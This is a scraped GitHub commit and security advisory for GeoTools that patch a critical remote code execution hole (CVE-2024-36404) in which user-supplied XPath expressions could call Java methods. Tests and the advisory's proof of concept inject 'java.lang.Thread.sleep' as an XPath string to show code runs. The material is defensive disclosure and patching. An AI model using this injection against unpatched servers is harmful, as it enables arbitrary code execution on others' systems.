This file contains bidirectional Unicode text that may be interpreted or compiled differently than what appears below. To review, open the file in an editor that reveals hidden Unicode characters.
[Learn more about bidirectional Unicode characters](https://github.co/hiddenchars)

  [Show hidden characters](%7B%7B%20revealButtonHref%20%7D%7D)

| Original file line number | Diff line number | Diff line change |
| --- | --- | --- |
| Expand Up | | @@ -290,6 +290,20 @@ public void testComplexFeature() { |
|  |  | "eg:complexAttribute/eg:rootAttribute/eg:multiLeafAttribute", |
|  |  | new Hints(FeaturePropertyAccessorFactory.NAMESPACE\_CONTEXT, NAMESPACES)); |
|  |  | assertEquals(multiLeafDesc, ex.evaluate(fType)); |
|  |  |  |
|  |  | // test that executing Java methods is blocked |
|  |  | ex = |
|  |  | new AttributeExpressionImpl( |
|  |  | "java.lang.Thread.sleep(30000)", |
|  |  | new Hints(FeaturePropertyAccessorFactory.NAMESPACE\_CONTEXT, NAMESPACES)); |
|  |  | long start = System.currentTimeMillis(); |
|  |  | assertNull(ex.evaluate(feature)); |
|  |  | long runtime = System.currentTimeMillis() - start; |
|  |  | assertTrue("java.lang.Thread.sleep(30000) was executed", runtime < 30000); |
|  |  | start = System.currentTimeMillis(); |
|  |  | assertNull(ex.evaluate(fType)); |
|  |  | runtime = System.currentTimeMillis() - start; |
|  |  | assertTrue("java.lang.Thread.sleep(30000) was executed", runtime < 30000); |
|  |  | } |
|  |  |  |
|  |  | public static FeatureType createFeatureType() { |
| Expand Down | |  |

37 changes: 37 additions & 0 deletions

37
[...tension/complex/src/test/java/org/geotools/filter/expression/MapPropertyAccessorTest.java](#diff-21f2f90abb817ad816e8b0e219c2b7f2b214ac27230fbb31674bb198d901d2dc "modules/extension/complex/src/test/java/org/geotools/filter/expression/MapPropertyAccessorTest.java")

Show comments

[View file](/geotools/geotools/blob/f0c9961dc4d40c5acfce2169fab92805738de5ea/modules/extension/complex/src/test/java/org/geotools/filter/expression/MapPropertyAccessorTest.java)
Edit file

Delete file

This file contains bidirectional Unicode text that may be interpreted or compiled differently than what appears below. To review, open the file in an editor that reveals hidden Unicode characters.
[Learn more about bidirectional Unicode characters](https://github.co/hiddenchars)

  [Show hidden characters](%7B%7B%20revealButtonHref%20%7D%7D)

| Original file line number | Diff line number | Diff line change |
| --- | --- | --- |
|  |  | @@ -0,0 +1,37 @@ |
|  |  | /\* |
|  |  | \* GeoTools - The Open Source Java GIS Toolkit |
|  |  | \* http://geotools.org |
|  |  | \* |
|  |  | \* (C) 2024, Open Source Geospatial Foundation (OSGeo) |
|  |  | \* |
|  |  | \* This library is free software; you can redistribute it and/or |
|  |  | \* modify it under the terms of the GNU Lesser General Public |
|  |  | \* License as published by the Free Software Foundation; |
|  |  | \* version 2.1 of the License. |
|  |  | \* |
|  |  | \* This library is distributed in the hope that it will be useful, |
|  |  | \* but WITHOUT ANY WARRANTY; without even the implied warranty of |
|  |  | \* MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the GNU |
|  |  | \* Lesser General Public License for more details. |
|  |  | \*/ |
|  |  | package org.geotools.filter.expression; |
|  |  |  |
|  |  | import static org.junit.Assert.assertTrue; |
|  |  |  |
|  |  | import java.util.Collections; |
|  |  | import org.geotools.api.filter.expression.PropertyName; |
|  |  | import org.geotools.factory.CommonFactoryFinder; |
|  |  | import org.junit.Test; |
|  |  |  |
|  |  | public class MapPropertyAccessorTest { |
|  |  |  |
|  |  | @Test |
|  |  | public void testAccessWithJavaMethod() { |
|  |  | PropertyName property = |
|  |  | CommonFactoryFinder.getFilterFactory().property("java.lang.Thread.sleep(30000)"); |
|  |  | long start = System.currentTimeMillis(); |
|  |  | property.evaluate(Collections.emptyMap()); |
|  |  | long runtime = System.currentTimeMillis() - start; |
|  |  | assertTrue("java.lang.Thread.sleep(30000) was executed", runtime < 30000); |
|  |  | } |
|  |  | } |

14 changes: 0 additions & 14 deletions

14
[modules/extension/xsd/xsd-core/pom.xml](#diff-3370380dd98e9749adebc91465fad1dd51cac90b4e76fd8ca9278ebca1accdd2 "modules/extension/xsd/xsd-core/pom.xml")

Show comments

[View file](/geotools/geotools/blob/f0c9961dc4d40c5acfce2169fab92805738de5ea/modules/extension/xsd/xsd-core/pom.xml)
Edit file

Delete file

This file contains bidirectional Unicode text that may be interpreted or compiled differently than what appears below. To review, open the file in an editor that reveals hidden Unicode characters.
[Learn more about bidirectional Unicode characters](https://github.co/hiddenchars)

  [Show hidden characters](%7B%7B%20revealButtonHref%20%7D%7D)

| Original file line number | Diff line number | Diff line change |
| --- | --- | --- |
| Expand Up | | @@ -90,20 +90,6 @@ |
|  |  | <groupId>commons-jxpath</groupId> |
|  |  | <artifactId>commons-jxpath</artifactId> |
|  |  | <version>1.3</version> |
|  |  | <exclusions> |
|  |  | <exclusion> |
|  |  | <groupId>xerces</groupId> |
|  |  | <artifactId>xerces</artifactId> |
|  |  | </exclusion> |
|  |  | <exclusion> |
|  |  | <groupId>servletapi</groupId> |
|  |  | <artifactId>servletapi</artifactId> |
|  |  | </exclusion> |
|  |  | <exclusion> |
|  |  | <groupId>junit</groupId> |
|  |  | <artifactId>junit</artifactId> |
|  |  | </exclusion> |
|  |  | </exclusions> |
|  |  | </dependency> |
|  |  | <dependency> |
|  |  | <groupId>org.apache.commons</groupId> |
| Expand Down | |  |

8 changes: 1 addition & 7 deletions

8
[...xsd/xsd-core/src/main/java/org/geotools/xsd/impl/jxpath/JXPathStreamingParserHandler.java](#diff-b33465a0672c5154fabc7c5fff76f88771995e72445f2fb486cf7deb187c2c53 "modules/extension/xsd/xsd-core/src/main/java/org/geotools/xsd/impl/jxpath/JXPathStreamingParserHandler.java")

Show comments

[View file](/geotools/geotools/blob/f0c9961dc4d40c5acfce2169fab92805738de5ea/modules/extension/xsd/xsd-core/src/main/java/org/geotools/xsd/impl/jxpath/JXPathStreamingParserHandler.java)
Edit file

Delete file

This file contains bidirectional Unicode text that may be interpreted or compiled differently than what appears below. To review, open the file in an editor that reveals hidden Unicode characters.
[Learn more about bidirectional Unicode characters](https://github.co/hiddenchars)

  [Show hidden characters](%7B%7B%20revealButtonHref%20%7D%7D)

| Original file line number | Diff line number | Diff line change |
| --- | --- | --- |
| Expand Up | | @@ -17,8 +17,6 @@ |
|  |  | package org.geotools.xsd.impl.jxpath; |
|  |  |  |
|  |  | import java.util.Iterator; |
|  |  | import org.apache.commons.jxpath.JXPathContext; |
|  |  | import org.apache.commons.jxpath.JXPathContextFactory; |
|  |  | import org.apache.commons.jxpath.JXPathIntrospector; |
|  |  | import org.geotools.xsd.Configuration; |
|  |  | import org.geotools.xsd.Node; |
| Expand Down  Expand Up | | @@ -47,11 +45,7 @@ protected boolean stream(ElementHandler handler) { |
|  |  | // ElementHandler rootHandler = |
|  |  | // ((DocumentHandler) handlers.firstElement()).getDocumentElementHandler(); |
|  |  | Node root = handlers.firstElement().getParseNode(); |
|  |  | JXPathContext jxpContext = JXPathContextFactory.newInstance().newContext(null, root); |
|  |  |  |
|  |  | jxpContext.setLenient(true); |
|  |  |  |
|  |  | Iterator itr = jxpContext.iterate(xpath); |
|  |  | Iterator itr = JXPathUtils.newSafeContext(root, true).iterate(xpath); |
|  |  |  |
|  |  | while (itr.hasNext()) { |
|  |  | Object obj = itr.next(); |
| Expand Down | |  |

64 changes: 64 additions & 0 deletions

64
[modules/extension/xsd/xsd-core/src/main/java/org/geotools/xsd/impl/jxpath/JXPathUtils.java](#diff-6e0fd86b25d51c6240ad166fd0ac1d8d4e3afd3c5612841d07c2b9a2c4914cf2 "modules/extension/xsd/xsd-core/src/main/java/org/geotools/xsd/impl/jxpath/JXPathUtils.java")

Show comments

[View file](/geotools/geotools/blob/f0c9961dc4d40c5acfce2169fab92805738de5ea/modules/extension/xsd/xsd-core/src/main/java/org/geotools/xsd/impl/jxpath/JXPathUtils.java)
Edit file

Delete file

This file contains bidirectional Unicode text that may be interpreted or compiled differently than what appears below. To review, open the file in an editor that reveals hidden Unicode characters.
[Learn more about bidirectional Unicode characters](https://github.co/hiddenchars)

  [Show hidden characters](%7B%7B%20revealButtonHref%20%7D%7D)

| Original file line number | Diff line number | Diff line change |
| --- | --- | --- |
|  |  | @@ -0,0 +1,64 @@ |
|  |  | /\* |
|  |  | \* GeoTools - The Open Source Java GIS Toolkit |
|  |  | \* http://geotools.org |
|  |  | \* |
|  |  | \* (C) 2024, Open Source Geospatial Foundation (OSGeo) |
|  |  | \* |
|  |  | \* This library is free software; you can redistribute it and/or |
|  |  | \* modify it under the terms of the GNU Lesser General Public |
|  |  | \* License as published by the Free Software Foundation; |
|  |  | \* version 2.1 of the License. |
|  |  | \* |
|  |  | \* This library is distributed in the hope that it will be useful, |
|  |  | \* but WITHOUT ANY WARRANTY; without even the implied warranty of |
|  |  | \* MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the GNU |
|  |  | \* Lesser General Public License for more details. |
|  |  | \*/ |
|  |  | package org.geotools.xsd.impl.jxpath; |
|  |  |  |
|  |  | import java.util.Enumeration; |
|  |  | import org.apache.commons.jxpath.FunctionLibrary; |
|  |  | import org.apache.commons.jxpath.JXPathContext; |
|  |  | import org.xml.sax.helpers.NamespaceSupport; |
|  |  |  |
|  |  | /\*\* Contains utility methods to create safe {@code JXPathContext} objects. \*/ |
|  |  | public class JXPathUtils { |
|  |  |  |
|  |  | /\*\* |
|  |  | \* Creates a {@code JXPathContext} that disables calling Java methods from XPath expressions. |
|  |  | \* |
|  |  | \* @param contextBean the root node object |
|  |  | \* @param lenient whether the context is in lenient mode |
|  |  | \* @return the context |
|  |  | \*/ |
|  |  | public static JXPathContext newSafeContext(Object contextBean, boolean lenient) { |
|  |  | return newSafeContext(contextBean, lenient, null, true); |
|  |  | } |
|  |  |  |
|  |  | /\*\* |
|  |  | \* Creates a {@code JXPathContext} that disables calling Java methods from XPath expressions. |
|  |  | \* |
|  |  | \* @param contextBean the root node object |
|  |  | \* @param lenient whether the context is in lenient mode |
|  |  | \* @param ns the namespaces |
|  |  | \* @param declared true to include all declared prefixes; false for all active prefixes |
|  |  | \* @return the context |
|  |  | \*/ |
|  |  | @SuppressWarnings("unchecked") |
|  |  | public static JXPathContext newSafeContext( |
|  |  | Object contextBean, boolean lenient, NamespaceSupport ns, boolean declared) { |
|  |  | JXPathContext context = JXPathContext.newContext(contextBean); |
|  |  | context.setLenient(lenient); |
|  |  | if (ns != null) { |
|  |  | Enumeration<String> prefixes = declared ? ns.getDeclaredPrefixes() : ns.getPrefixes(); |
|  |  | while (prefixes.hasMoreElements()) { |
|  |  | String prefix = prefixes.nextElement(); |
|  |  | String uri = ns.getURI(prefix); |
|  |  | context.registerNamespace(prefix, uri); |
|  |  | } |
|  |  | } |
|  |  | // Set empty function library to prevent calling functions |
|  |  | context.setFunctions(new FunctionLibrary()); |
|  |  | return context; |
|  |  | } |
|  |  | } |

13 changes: 13 additions & 0 deletions

13
[modules/extension/xsd/xsd-core/src/test/java/org/geotools/xsd/StreamingParserTest.java](#diff-35b25d78737fbba349f6122e6ed3373ae5c731a563172be688c4ec24e1a296b6 "modules/extension/xsd/xsd-core/src/test/java/org/geotools/xsd/StreamingParserTest.java")

Show comments

[View file](/geotools/geotools/blob/f0c9961dc4d40c5acfce2169fab92805738de5ea/modules/extension/xsd/xsd-core/src/test/java/org/geotools/xsd/StreamingParserTest.java)
Edit file

Delete file

This file contains bidirectional Unicode text that may be interpreted or compiled differently than what appears below. To review, open the file in an editor that reveals hidden Unicode characters.
[Learn more about bidirectional Unicode characters](https://github.co/hiddenchars)

  [Show hidden characters](%7B%7B%20revealButtonHref%20%7D%7D)

| Original file line number | Diff line number | Diff line change |
| --- | --- | --- |
| Expand Up | | @@ -17,6 +17,7 @@ |
|  |  | package org.geotools.xsd; |
|  |  |  |
|  |  | import static org.junit.Assert.assertNull; |
|  |  | import static org.junit.Assert.assertTrue; |
|  |  |  |
|  |  | import java.io.ByteArrayInputStream; |
|  |  | import javax.xml.namespace.QName; |
| Expand All | | @@ -39,4 +40,16 @@ public void testParseXXE() throws Exception { |
|  |  | // StreamingParser returns null if the parsing fails |
|  |  | assertNull(parser.parse()); |
|  |  | } |
|  |  |  |
|  |  | @Test |
|  |  | public void testParseWithJavaMethod() throws Exception { |
|  |  | ByteArrayInputStream in = new ByteArrayInputStream("<mails></mails>".getBytes()); |
|  |  | StreamingParser parser = |
|  |  | new StreamingParser(new MLConfiguration(), in, "java.lang.Thread.sleep(30000)"); |
|  |  | // StreamingParser returns null if the parsing fails |
|  |  | long start = System.currentTimeMillis(); |
|  |  | assertNull(parser.parse()); |
|  |  | long runtime = System.currentTimeMillis() - start; |
|  |  | assertTrue("java.lang.Thread.sleep(30000) was executed", runtime < 30000); |
|  |  | } |
|  |  | } |

Toggle all file notes
Toggle all file annotations

### 0 comments on commit `f0c9961`

Please
[sign in](/login?return_to=https%3A%2F%2Fgithub.com%2Fgeotools%2Fgeotools%2Fcommit%2Ff0c9961dc4d40c5acfce2169fab92805738de5ea) to comment.

## Footer

¬© 2025 GitHub,¬†Inc.

### Footer navigation

* [Terms](https://docs.github.com/site-policy/github-terms/github-terms-of-service)
* [Privacy](https://docs.github.com/site-policy/privacy-policies/github-privacy-statement)
* [Security](https://github.com/security)
* [Status](https://www.githubstatus.com/)
* [Docs](https://docs.github.com/)
* [Contact](https://support.github.com?tags=dotcom-footer)
* Manage cookies
* Do not share my personal information

You can‚Äôt perform that action at this time.



=== Content from github.com_36f73f77_20250111_082232.html ===

[Skip to content](#start-of-content)

## Navigation Menu

Toggle navigation

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2Fgeotools%2Fgeotools%2Fsecurity%2Fadvisories%2FGHSA-w3pj-wh35-fq8w)

* Product

  + [GitHub Copilot
    Write better code with AI](https://github.com/features/copilot)
  + [Security
    Find and fix vulnerabilities](https://github.com/features/security)
  + [Actions
    Automate any workflow](https://github.com/features/actions)
  + [Codespaces
    Instant dev environments](https://github.com/features/codespaces)
  + [Issues
    Plan and track work](https://github.com/features/issues)
  + [Code Review
    Manage code changes](https://github.com/features/code-review)
  + [Discussions
    Collaborate outside of code](https://github.com/features/discussions)
  + [Code Search
    Find more, search less](https://github.com/features/code-search)

  Explore
  + [All features](https://github.com/features)
  + [Documentation](https://docs.github.com)
  + [GitHub Skills](https://skills.github.com)
  + [Blog](https://github.blog)
* Solutions

  By company size
  + [Enterprises](https://github.com/enterprise)
  + [Small and medium teams](https://github.com/team)
  + [Startups](https://github.com/enterprise/startups)
  By use case
  + [DevSecOps](/solutions/use-case/devsecops)
  + [DevOps](/solutions/use-case/devops)
  + [CI/CD](/solutions/use-case/ci-cd)
  + [View all use cases](/solutions/use-case)

  By industry
  + [Healthcare](/solutions/industry/healthcare)
  + [Financial services](/solutions/industry/financial-services)
  + [Manufacturing](/solutions/industry/manufacturing)
  + [Government](/solutions/industry/government)
  + [View all industries](/solutions/industry)

  [View all solutions](/solutions)
* Resources

  Topics
  + [AI](/resources/articles/ai)
  + [DevOps](/resources/articles/devops)
  + [Security](/resources/articles/security)
  + [Software Development](/resources/articles/software-development)
  + [View all](/resources/articles)

  Explore
  + [Learning Pathways](https://resources.github.com/learn/pathways)
  + [White papers, Ebooks, Webinars](https://resources.github.com)
  + [Customer Stories](https://github.com/customer-stories)
  + [Partners](https://partner.github.com)
  + [Executive Insights](https://github.com/solutions/executive-insights)
* Open Source

  + [GitHub Sponsors
    Fund open source developers](/sponsors)
  + [The ReadME Project
    GitHub community articles](https://github.com/readme)
  Repositories
  + [Topics](https://github.com/topics)
  + [Trending](https://github.com/trending)
  + [Collections](https://github.com/collections)
* Enterprise

  + [Enterprise platform
    AI-powered developer platform](/enterprise)
  Available add-ons
  + [Advanced Security
    Enterprise-grade security features](https://github.com/enterprise/advanced-security)
  + [GitHub Copilot
    Enterprise-grade AI features](/features/copilot#enterprise)
  + [Premium Support
    Enterprise-grade 24/7 support](/premium-support)
* [Pricing](https://github.com/pricing)

Search or jump to...

# Search code, repositories, users, issues, pull requests...

Search

Clear

[Search syntax tips](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax)

# Provide feedback

We read every piece of feedback, and take your input very seriously.

Include my email address so I can be contacted

  Cancel

 Submit feedback

# Saved searches

## Use saved searches to filter your results more quickly

Name

Query

To see all available qualifiers, see our [documentation](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax).

  Cancel

 Create saved search

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2Fgeotools%2Fgeotools%2Fsecurity%2Fadvisories%2FGHSA-w3pj-wh35-fq8w)

[Sign up](/signup?ref_cta=Sign+up&ref_loc=header+logged+out&ref_page=%2F%3Cuser-name%3E%2F%3Crepo-name%3E%2Frepos%2Fadvisories%2Fshow&source=header-repo&source_repo=geotools%2Fgeotools)
Reseting focus

You signed in with another tab or window. Reload to refresh your session.
You signed out in another tab or window. Reload to refresh your session.
You switched accounts on another tab or window. Reload to refresh your session.

Dismiss alert

{{ message }}

[geotools](/geotools)
/
**[geotools](/geotools/geotools)**
Public

* [Notifications](/login?return_to=%2Fgeotools%2Fgeotools) You must be signed in to change notification settings
* [Fork
  1.2k](/login?return_to=%2Fgeotools%2Fgeotools)
* [Star
   1.7k](/login?return_to=%2Fgeotools%2Fgeotools)

* [Code](/geotools/geotools)
* [Pull requests
  3](/geotools/geotools/pulls)
* [Actions](/geotools/geotools/actions)
* [Projects
  0](/geotools/geotools/projects)
* [Wiki](/geotools/geotools/wiki)
* [Security](/geotools/geotools/security)
* [Insights](/geotools/geotools/pulse)

Additional navigation options

* [Code](/geotools/geotools)
* [Pull requests](/geotools/geotools/pulls)
* [Actions](/geotools/geotools/actions)
* [Projects](/geotools/geotools/projects)
* [Wiki](/geotools/geotools/wiki)
* [Security](/geotools/geotools/security)
* [Insights](/geotools/geotools/pulse)

# Remote Code Execution (RCE) vulnerability in evaluating XPath expressions

Critical

[jodygarnett](/jodygarnett)
published
GHSA-w3pj-wh35-fq8w
Jul 2, 2024

## Package

maven

org.geotools.xsd:gt-xsd-core
([Maven](/advisories?query=ecosystem%3Amaven))

## Affected versions

>= 30.0, < 30.4
>= 31.0, < 31.2
< 29.6

## Patched versions

30.4
31.2
29.6

maven

org.geotools:gt-app-schema
([Maven](/advisories?query=ecosystem%3Amaven))

>= 30.0, < 30.4
>= 31.0, < 31.2
< 29.6

30.4
31.2
29.6

maven

org.geotools:gt-complex
([Maven](/advisories?query=ecosystem%3Amaven))

>= 30.0, < 30.4
>= 31.0, < 31.2
< 29.6

30.4
31.2
29.6

## Description

### Summary

Remote Code Execution (RCE) is possible if an application uses certain GeoTools functionality to evaluate XPath expressions supplied by user input.

### Details

The following methods pass XPath expressions to the `commons-jxpath` library which can execute arbitrary code and would be a security issue if the XPath expressions are provided by user input.

* `org.geotools.appschema.util.XmlXpathUtilites.getXPathValues(NamespaceSupport, String, Document)`
* `org.geotools.appschema.util.XmlXpathUtilites.countXPathNodes(NamespaceSupport, String, Document)`
* `org.geotools.appschema.util.XmlXpathUtilites.getSingleXPathValue(NamespaceSupport, String, Document)`
* `org.geotools.data.complex.expression.FeaturePropertyAccessorFactory.FeaturePropertyAccessor.get(Object, String, Class<T>)`
* `org.geotools.data.complex.expression.FeaturePropertyAccessorFactory.FeaturePropertyAccessor.set(Object, String, Object, Class)`
* `org.geotools.data.complex.expression.MapPropertyAccessorFactory.new PropertyAccessor() {...}.get(Object, String, Class<T>)`
* `org.geotools.xsd.StreamingParser.StreamingParser(Configuration, InputStream, String)`

### PoC

The following inputs to StreamingParser will delay the response by five seconds:

```
        new org.geotools.xsd.StreamingParser(
                        new org.geotools.filter.v1_0.OGCConfiguration(),
                        new java.io.ByteArrayInputStream("<Filter></Filter>".getBytes()),
                        "java.lang.Thread.sleep(5000)")
                .parse();

```
### Impact

This vulnerability can lead to executing arbitrary code.

### Mitigation

GeoTools can operate with reduced functionality by removing the `gt-complex` jar from your application. As an example of the impact application schema datastore would not function without the ability to use XPath expressions to query complex content.

The SourceForge download page lists drop-in-replacement jars for GeoTools: [31.1](https://sourceforge.net/projects/geotools/files/GeoTools%2031%20Releases/31.1/), [30.3](https://sourceforge.net/projects/geotools/files/GeoTools%2030%20Releases/30.3/geotools-30.3-patches.zip/download), [30.2](https://sourceforge.net/projects/geotools/files/GeoTools%2030%20Releases/30.2/geotools-30.2-patches.zip/download), [29.2](https://sourceforge.net/projects/geotools/files/GeoTools%2029%20Releases/29.2/geotools-29.2-patches.zip/download), [28.2](https://sourceforge.net/projects/geotools/files/GeoTools%2028%20Releases/28.2/geotools-28.2-patches.zip/download), [27.5](https://sourceforge.net/projects/geotools/files/GeoTools%2027%20Releases/27.5/geotools-27.5-patches.zip/download), [27.4](https://sourceforge.net/projects/geotools/files/GeoTools%2027%20Releases/27.4/geotools-27.4-patches.zip/download), [26.7](https://sourceforge.net/projects/geotools/files/GeoTools%2026%20Releases/26.7/geotools-26.7-patches.zip/download), [26.4](https://sourceforge.net/projects/geotools/files/GeoTools%2026%20Releases/26.4/), [25.2](https://sourceforge.net/projects/geotools/files/GeoTools%2025%20Releases/25.2/geotools-25.2-patches.zip/download), [24.0](https://sourceforge.net/projects/geotools/files/GeoTools%2024%20Releases/24.0/geotools-24.0-patches.zip/download). These jars are for download only and are not available from maven central, intended to quickly provide a fix to affected applications.

### References

[GHSA-6jj6-gm7p-fcvv](https://github.com/geoserver/geoserver/security/advisories/GHSA-6jj6-gm7p-fcvv "GHSA-6jj6-gm7p-fcvv")

<https://osgeo-org.atlassian.net/browse/GEOT-7587>

[#4797](https://github.com/geotools/geotools/pull/4797)

<https://github.com/Warxim/CVE-2022-41852?tab=readme-ov-file#workaround-for-cve-2022-41852>

### Severity

Critical

9.8

# CVSS overall score

 This score calculates overall vulnerability severity from 0 to 10 and is based on the Common Vulnerability Scoring System (CVSS).

 / 10

#### CVSS v3 base metrics

Attack vector
Network

Attack complexity
Low

Privileges required
None

User interaction
None

Scope
Unchanged

Confidentiality
High

Integrity
High

Availability
High

Learn more about base metrics

# CVSS v3 base metrics

Attack vector:
More severe the more the remote (logically and physically) an attacker can be in order to exploit the vulnerability.

Attack complexity:
More severe for the least complex attacks.

Privileges required:
More severe if no privileges are required.

User interaction:
More severe when no user interaction is required.

Scope:
More severe when a scope change occurs, e.g. one vulnerable component impacts resources in components beyond its security scope.

Confidentiality:
More severe when loss of data confidentiality is highest, measuring the level of data access available to an unauthorized user.

Integrity:
More severe when loss of data integrity is the highest, measuring the consequence of data modification possible by an unauthorized user.

Availability:
More severe when the loss of impacted component availability is highest.

CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H

### CVE ID

CVE-2024-36404

### Weaknesses

[CWE-95](/advisories?query=cwe%3A95)

### Credits

* [![@sikeoka](https://avatars.githubusercontent.com/u/11542093?s=40&v=4)](/sikeoka)
  [sikeoka](/sikeoka)
  Reporter
* [![@jodygarnett](https://avatars.githubusercontent.com/u/629681?s=40&v=4)](/jodygarnett)
  [jodygarnett](/jodygarnett)
  Coordinator

## Footer

¬© 2025 GitHub,¬†Inc.

### Footer navigation

* [Terms](https://docs.github.com/site-policy/github-terms/github-terms-of-service)
* [Privacy](https://docs.github.com/site-policy/privacy-policies/github-privacy-statement)
* [Security](https://github.com/security)
* [Status](https://www.githubstatus.com/)
* [Docs](https://docs.github.com/)
* [Contact](https://support.github.com?tags=dotcom-footer)
* Manage cookies
* Do not share my personal information

You can‚Äôt perform that action at this time.


